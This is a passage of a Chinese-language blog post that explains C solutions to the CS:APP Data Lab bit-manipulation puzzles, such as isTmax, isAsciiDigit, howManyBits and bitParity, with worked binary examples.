</span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = x &gt;&gt; <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">return</span>  !( (y &gt;&gt; <span class="number">16</span>) ^ y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题主要是判断int型的x能不能用16位二进制补码来表示，首先对于能用16位二进制补码来表示的数应该满足一下格式：</p><p>正数：<code>0000 0000 0000 0000 0··· ···· ···· ····</code></p><p>负数：<code>1111 1111 1111 1111 1··· ···· ···· ····</code></p><p>其中省略号为1或0，所以如果将该右移15位之后（由于是有符号数的右移所以为算术右移）可能补上的1或者为0取决于符号位，右移结果如果全为1或者全为0，此时就代表着该数能用16位二进制补码表示，最后的<code>return  !( (y &gt;&gt; 16) ^ y)</code>第一次右移结果再进行右移16位获得一个全为1或者全为0与第一次右移的序列进行异或，异或的结果如果不为0，则代表着该数不能用16位二进制补码表示。</p><p>举个例子 <code>0000 0000 0000 0010 0111 1111 1111 1111</code>进行第一次右移得到</p><p><code>0000 0000 0000 0000 0000 0000 0000 0010</code>判断该位模式是否为全0，再对其进行右移16位得到</p><p><code>0000 0000 0000 0000 0000 0000 0000 0000</code>一个全0序列，此时再与原序列进行异或得到结果不为0，则代表着输入的结果低位有效数字不止15位</p><h1 id="5-isTmax-x"><a href="#5-isTmax-x" class="headerlink" title="5.isTmax(x)"></a>5.isTmax(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i = x+<span class="number">1</span>;<span class="comment">//Tmin,1000...</span></span><br><span class="line">  x=x+i;<span class="comment">//-1,1111...</span></span><br><span class="line">  x=~x;<span class="comment">//0,0000...</span></span><br><span class="line">  i=!i;<span class="comment">//exclude x=0xffff...</span></span><br><span class="line">  x=x+i;<span class="comment">//exclude x=0xffff...</span></span><br><span class="line">  <span class="keyword">return</span> !x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题判断的是输入的值是不是最大值（这里的最大值指的是符号为0，其他位全为1），如果是最大值就返回一个1。如果传入的是最大值，可以考虑先把该数转为全0，再对其进行非操作，最后得出的结果就是1。对最大值加1之后由于补码的特性此时位模式应该为<code>10000000····000</code>然后再跟他本身<code>1111···111</code>相加之后就得到了一个全为1的序列，再对其进行取反就得到全为0；</p><p><strong>但是如果传入的是-1，此时对其+1会得到一个全0序列，再执行第二步也会得到一个全1的序列，结果也是一样，此时第三步第四步是为了防止这种情况，因为最大值执行到第三步此时的i是为<code>1000··000</code>而-1则是全为<code>0000···000</code>，再对其进行非操作的话，最大值情况的i会全为0，而-1情况的i则是变为1，所以在加上一个x的全0序列的话-1情况下的x就不为0了</strong></p><p>如果其他数在第一步+1情况下就不会溢出，所以就没法得到一个全为1的序列</p><h1 id="6-allOddBits-x"><a href="#6-allOddBits-x" class="headerlink" title="6.allOddBits(x)"></a>6.allOddBits(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"> * allOddBits - <span class="keyword">return</span> <span class="number">1</span> <span class="keyword">if</span> all odd-numbered bits in word set to <span class="number">1</span></span><br><span class="line"> *   where bits are numbered from <span class="number">0</span> (least </span><br><span class="line"></span><br><span class="line">ificant) to <span class="number">31</span> (most significant)</span><br><span class="line"> *   Examples <span class="built_in">allOddBits</span>(<span class="number">0xFFFFFFFD</span>) = <span class="number">0</span>, <span class="built_in">allOddBits</span>(<span class="number">0xAAAAAAAA</span>) = <span class="number">1</span></span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: <span class="number">12</span></span><br><span class="line"> *   Rating: <span class="number">2</span></span><br><span class="line"> */</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">allOddBits</span>(<span class="keyword">int</span> x) &#123;</span><br><span class="line"><span class="comment">//AAAA AAAA</span></span><br><span class="line">  <span class="keyword">int</span> mask = <span class="number">0xAA</span>+(<span class="number">0xAA</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  mask=mask+(mask&lt;&lt;<span class="number">16</span>);</span><br><span class="line">  <span class="comment">//int mask=0xAAAAAAAA;  </span></span><br><span class="line">  <span class="keyword">return</span> !((mask&amp;x)^mask);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该题主要是如果奇数位置全为1的话，就返回1，如果没有就返回0。主要核心是构造序列<code>‭10101010101010101010101010101010‬</code>也就是mask，然后mask与x及进行第一次&amp;操作，<strong>第一种</strong>得到的结果如果奇数位全为1的话还是mask这个序列，<strong>第二种</strong>如果有不为1的话会缺失一定数量奇数位的1，再将得到的结果与mask进行异或就能分别出以上两种情况，如果异或的结果为0就是第一种情况，在进行！操作就能输出1，如果异或的结果为1就是第二种情况，再进行!操作就会输出0。</p><h1 id="7-anyEvenBit-x"><a href="#7-anyEvenBit-x" class="headerlink" title="7.anyEvenBit(x)"></a>7.anyEvenBit(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * anyEvenBit - return 1 if any even-numbered bit in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples anyEvenBit(0xA) = 0, anyEvenBit(0xE) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">anyEvenBit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a=<span class="number">0x5</span>;</span><br><span class="line">  <span class="keyword">int</span> b=(a&lt;&lt;<span class="number">4</span>)+a;</span><br><span class="line">  a=(b&lt;&lt;<span class="number">8</span>)+b;</span><br><span class="line">  b=(a&lt;&lt;<span class="number">16</span>)+a;</span><br><span class="line">  x=x&amp;b;</span><br><span class="line">  <span class="keyword">return</span> !!x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序主要是如果0-31位的位模式如果偶数位出现1，则返回一个1，如果偶数位都为0，则返回1。基本思路就x与一个偶数位全为1的数进行&amp;运算，这样运算下来的值如果不为0，则代表偶数位存在1，返回1。5的二进制数为<code>0101</code>，对其进行偏移到<code>01010101010101010101010101010101</code>该数的偶数为全为1就是最后b的值。然后如果运算结果x最后不为0要输出1，所以进行两次非操作。</p><h1 id="8-negate-x"><a href="#8-negate-x" class="headerlink" title="8.negate(x)"></a>8.negate(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题主要进行的是一个求负数，按照补码的原理进行操即可（取反加1)</p><h1 id="9-isAsciiDigit-x"><a href="#9-isAsciiDigit-x" class="headerlink" title="9.isAsciiDigit(x)"></a>9.isAsciiDigit(x)</h1><blockquote><p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sign=<span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;<span class="comment">//1 000···00</span></span><br><span class="line">  <span class="keyword">int</span> up=~(sign|<span class="number">0x39</span>); <span class="comment">//得到的序列是</span></span><br><span class="line">  <span class="keyword">int</span> down=~<span class="number">0x30</span>;</span><br><span class="line">  up=(up+x)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  down=(down+<span class="number">1</span>+x)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> !(up|down);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于ASCII 码0-9代表的数值为48-57：两种情况，<strong>第一种情况</strong>对于大于57的数字，应该构造一个序列，应该构造符号位为0，其他位置是加上57以上的数就会溢出到符号位，由于57位模式为<code>‭00111001‬</code>，其构造的序列应该为<code>‭01111111111111111111111111000110‬‬</code>也就是其有效位置应该与57相反；<strong>第二种情况</strong>对于小于48的数字，直接对48取反会得到-49，此时的符号位为1，对它加上+1+（48以上的数字）就会溢出到符号位变为0。</p><p>由于以上的两种情况都是符号位为0代表着着输出的数值为48-57，如果为1代表着输出不在这个范围，由于int是有符号数，对其进行的右移为逻辑右移，符号位为0的话右移的结果就会为0，在输入范围内的值up|down的输出应该都全为0，如果一个不满足的话都会产生一个非0序列，再对其进行！操作就可以获得输出结果。</p><h1 id="10-conditional（x-y-z"><a href="#10-conditional（x-y-z" class="headerlink" title="10.conditional（x,y,z)"></a>10.conditional（x,y,z)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !!x;</span><br><span class="line">  x = ~x+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题是实现一个三目运算符，首先输入的x不为0，<strong>输出y不输出z</strong>，将y与全1的序列相与，将z与一个全0的序列相与就可以得到结果。对非0的x进行!!操作可以得到1，再取反+1得到一个全1序列满足上述情况；输入的x为0，进行两次非操作，再取反加1得到的结果还是全为0的序列，刚好与上述情况相反。</p><h1 id="11-isLessOrEqual-x-y"><a href="#11-isLessOrEqual-x-y" class="headerlink" title="11.isLessOrEqual(x,y)"></a>11.isLessOrEqual(x,y)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> negX=~x+<span class="number">1</span>;<span class="comment">//-x</span></span><br><span class="line">  <span class="keyword">int</span> addX=negX+y;<span class="comment">//y-x</span></span><br><span class="line">  <span class="keyword">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>; <span class="comment">//y-x的符号</span></span><br><span class="line">  <span class="keyword">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;<span class="comment">//最大位为1的32位有符号数</span></span><br><span class="line">  <span class="keyword">int</span> xLeft = x&amp;leftBit;<span class="comment">//x的符号</span></span><br><span class="line">  <span class="keyword">int</span> yLeft = y&amp;leftBit;<span class="comment">//y的符号</span></span><br><span class="line">  <span class="keyword">int</span> bitXor = xLeft ^ yLeft;<span class="comment">//x和y符号相同标志位，相同为0不同为1</span></span><br><span class="line">  bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;<span class="comment">//符号相同标志位格式化为0或1</span></span><br><span class="line">  <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));<span class="comment">//返回1有两种情况：符号相同标志位为0（相同）位与 y-x 的符号为0（y-x&gt;=0）结果为1；符号相同标志位为1（不同）位与x的符号位为1（x&lt;0）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题要求输出的x比y小，其实补码一开始被使用的话也是为了实现减法。输入有两种情况，第一种情况为是否为相反符号，如果为相反符号，那么x应该为负数符号位为1才满足情况；第二种情况符号相同，对其进行y-x的操作，对x进行取反+1得到了-x，在与y进行相加，对相加的结果进行&gt;&gt;31得到0或1，如果y-x&gt;=0的，checkSign应该为0，满足要求。</p><h1 id="12-ezTreeFourths-x"><a href="#12-ezTreeFourths-x" class="headerlink" title="12.ezTreeFourths(x)"></a>12.ezTreeFourths(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ezThreeFourths - multiplies by 3/4 rounding toward 0,</span></span><br><span class="line"><span class="comment"> *   Should exactly duplicate effect of C expression (x*3/4),</span></span><br><span class="line"><span class="comment"> *   including overflow behavior.</span></span><br><span class="line"><span class="comment"> *   Examples: ezThreeFourths(11) = 8</span></span><br><span class="line"><span class="comment"> *             ezThreeFourths(-9) = -6</span></span><br><span class="line"><span class="comment"> *             ezThreeFourths(1073741824) = -268435456 (overflow)</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ezThreeFourths</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  x = x + (x &lt;&lt; <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> (x+(x&gt;&gt;<span class="number">31</span>&amp;<span class="number">3</span>))&gt;&gt;<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题主要是int的除法，由于int的乘法与除法主要通过左移右移实现，所以对于x3/4我们可以分解成乘3除4，x+(x&lt;&lt;1)实现的就是x3；而除4对于<strong>正数</strong>来说直接左移2位就行，因为是直接舍去小数位置</p><p>例如：35/4=8.75-&gt;8 2.33-&gt;2</p><p>二进制表示就是 ‭<code>00100011‬</code>(35)  <code>000100.11</code>(8.75)  直接舍去小数位置得到一个<code>0100</code>(8)，所以除以4直接将最后两位舍去就行</p><p>对于<strong>负数</strong>来说</p><p>例如：-35/4=-8.75-&gt;-8</p><p>用二进制表示<code>‭111111111111111111111111 1101 1101‬</code>(-35)</p><p>如果直接右移两位的话则变成<code>‭111111111111111111111111 1111 0111‬</code>(-9)</p><p>而要得到<code>‭111111111111111111111111 1111 1000‬</code>(-8)则应该将最后两位进位，加上<code>0011</code>，</p><p><code>‭11111111111111111111111111100000‬</code>(-32)在对其进行右移两位得到就是-8。</p><p><strong>负数进行除法的时候要小数部分要先保存下来，不然直接舍去的话数字会变小，就是往负无穷靠近</strong></p><p><strong>正数除法未除尽变小，负数变大（都是舍去小数部分）</strong></p><h1 id="13-logicalNeg-x"><a href="#13-logicalNeg-x" class="headerlink" title="13.logicalNeg(x)"></a>13.logicalNeg(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(((~x+<span class="number">1</span>)|x)&gt;&gt; <span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题是为了实现非运算，如果是非0数的话输出0，0数输出为1。</p><p>对于正数来说的话取反+1得到的符号位肯定与元素不一样，而对于负数来说的话如果是tmin=‭-2147483648‬取反加1是它本身，符号位不变，所以不能用^进行操作，必须使用|。</p><h1 id="14-howmanyBits-x"><a href="#14-howmanyBits-x" class="headerlink" title="14.howmanyBits(x)"></a>14.howmanyBits(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  x ^= (x&lt;&lt;<span class="number">1</span>);</span><br><span class="line">  n += ((!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">16</span>)))) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">  n += ((!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">8</span>)))) &lt;&lt; <span class="number">3</span>);</span><br><span class="line">  n += ((!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">4</span>)))) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">  n += ((!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">2</span>)))) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">  n += (!!(x&amp;((~<span class="number">0</span>)&lt;&lt;(n+<span class="number">1</span>))));</span><br><span class="line">  <span class="keyword">return</span> n+<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">return</span>  <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题是判断需要多少位的补码能表示该数字，其实实质就是找到最高位的1在哪个位置，由于补码的特性有一位表示符号位，所以对于输入的数字应该进行预先的处理x^(x&lt;&lt;1)。</p><p>假设输入的数字为<code>0000 1000</code>(8)，处理后的结果为<code>0001 1000</code>将符号位置为1，需要5位补码。</p><p> <code>1111 1000‬</code>（-8）处理的结果为<code>0000 1000</code>符号位置同样被置为1，该数需要4位补码。</p><p><code>‭0000 000 0 1000 1001 0000 0000 0000 0000</code>  ‭8978432‬有效补码应该是25<br><code>‭0000 000 1 1000 1001 0000 0000 0000 0000</code><br>比较前16位（掩码&lt;&lt;0+16）满足条件+16<br>比较前8位（掩码&lt;&lt;16+8）满足条件 16+8=24<br>比较前4位 （掩码&lt;&lt;24+4）满足条件<br>比较前6位 （掩码&lt;&lt;24+2)不满足条件<br>比较前7位 （掩码&lt;&lt;24+1不满足条件</p><p>由于最后比较是4+2+1七个位置，所以最后结果必须加1才能得到24+1=25</p><p><strong>上面的掩码都为全1也就是-1</strong></p><h1 id="15-bitParity-x"><a href="#15-bitParity-x" class="headerlink" title="15.bitParity(x)"></a>15.bitParity(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitParity - returns 1 if x contains an odd number of 0&#x27;s</span></span><br><span class="line"><span class="comment"> *   Examples: bitParity(5) = 0, bitParity(7) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 20</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitParity</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  x^=x&gt;&gt;<span class="number">16</span>;</span><br><span class="line">  x^=x&gt;&gt;<span class="number">8</span>;</span><br><span class="line">  x^=x&gt;&gt;<span class="number">4</span>;</span><br><span class="line">  x^=x&gt;&gt;<span class="number">2</span>;</span><br><span class="line">  x^=x&gt;&gt;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> x&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若x中含有奇数个0返回1，由于输出的int型是32位，所以如果奇数个1代表着也同样有奇数个0；基本思路是算出输入的数是否有奇数个1，由于不需要输出个数，所以判断是否有就行，此时我们可以使用二分法进行异或，使里面的1进行抵消，将结果存在最低的一位，如果最低1位为1，则代表里面有奇数个1，没办法完全抵消，0则反之。</p><p>例如<code>0000 0110 1001 1111 0110 1011 1100 0111</code>(111111111)<strong>x^=x&gt;&gt;16</strong></p><p>得到<code>0000 0110 1001 1111|0110 1101 0101 1000</code>得到的结果存在低16位，继续 <strong>x^=x&gt;&gt;8</strong></p><p>得到<code>0000 0110 1001 1001 1111 0010|0011 0101</code>得到的结果存在低8位，继续  <strong>x^=x&gt;&gt;4</strong></p><p>得到<code>0000 0110 1111 0000 0110 1101 0001|0110</code>得到的结果存在低4位，继续  <strong>x^=x&gt;&gt;2</strong></p><p>得到<code>0000 0111 0100 1100 0111 0110 0101 00|11</code>得到的结果存在低2位，继续<strong>x^=x&gt;&gt;1</strong></p><p>得到<code>0000 0100 1110 1010 0100 1101 0111 101|0</code>得到的结果存在最后1位。即为对答案，最低位由于是0，所以该序列中有偶数个1，同样有偶数个0，返回0。</p><h1 id="16-intLog2-x"><a href="#16-intLog2-x" class="headerlink" title="16.intLog2(x)"></a>16.intLog2(x)</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * intLog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class="line"><span class="comment"> *   Example: intLog2(16) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; 